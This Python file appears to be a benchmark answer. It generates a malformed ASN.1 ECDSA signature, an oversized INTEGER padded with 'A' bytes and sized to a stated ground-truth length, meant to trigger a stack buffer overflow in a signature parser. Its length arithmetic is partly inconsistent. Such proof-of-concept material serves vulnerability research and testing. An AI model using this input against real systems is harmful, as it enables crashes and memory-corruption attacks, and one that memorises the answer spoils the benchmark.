import os
import struct
import subprocess
import tempfile
import hashlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability is in ECDSA signature parsing from ASN.1
        # We need to create a malformed ASN.1 structure that causes a stack buffer overflow
        # Based on the ground-truth length (41798 bytes), we'll create a similar PoC
        
        # Build the PoC as ASN.1 DER encoded ECDSA signature with overflow
        # Structure: SEQUENCE { INTEGER r, INTEGER s }
        # We'll make one of the integers extremely large to overflow a fixed-size buffer
        
        # Start with ASN.1 SEQUENCE tag and length
        # We'll use indefinite length encoding to create ambiguity
        poc = bytearray()
        
        # SEQUENCE tag (0x30) with constructed bit (0x20) and indefinite length
        poc.extend(b'\x30\x80')  # SEQUENCE, indefinite length
        
        # First INTEGER (r) - normal size
        # INTEGER tag (0x02) with short length
        poc.extend(b'\x02\x20')  # INTEGER, 32 bytes length
        poc.extend(b'\x00' * 32)  # 32 bytes of zeros
        
        # Second INTEGER (s) - overflow size
        # We'll make this very large to trigger stack buffer overflow
        # INTEGER tag (0x02) with long length encoding
        # The ground-truth length is 41798, so we need total poc of that size
        # Current size: 2 (sequence) + 2 (r header) + 32 (r) = 36 bytes
        # We need s to be approximately 41798 - 36 = 41762 bytes
        
        # Use long form length encoding for s
        # 0x82 means 2-byte length follows
        s_length = 41762  # Total needed minus some overhead
        poc.extend(b'\x02\x82')  # INTEGER with 2-byte length
        poc.extend(struct.pack('>H', s_length))  # Big-endian 2-byte length
        
        # Fill s with pattern that may help exploit (0x41 = 'A')
        poc.extend(b'\x41' * s_length)
        
        # End of indefinite length SEQUENCE
        poc.extend(b'\x00\x00')
        
        # Verify total length
        total_len = len(poc)
        
        # Adjust to match exactly 41798 bytes if needed
        if total_len < 41798:
            # Add padding at the end of s data
            padding_needed = 41798 - total_len
            # Insert padding in the s data section (before end markers)
            poc = poc[:-2] + b'\x41' * padding_needed + poc[-2:]
        elif total_len > 41798:
            # Truncate from s data
            excess = total_len - 41798
            poc = poc[:-excess-2] + poc[-2:]
        
        # Final verification
        assert len(poc) == 41798, f"Generated PoC length {len(poc)} != 41798"
        
        return bytes(poc)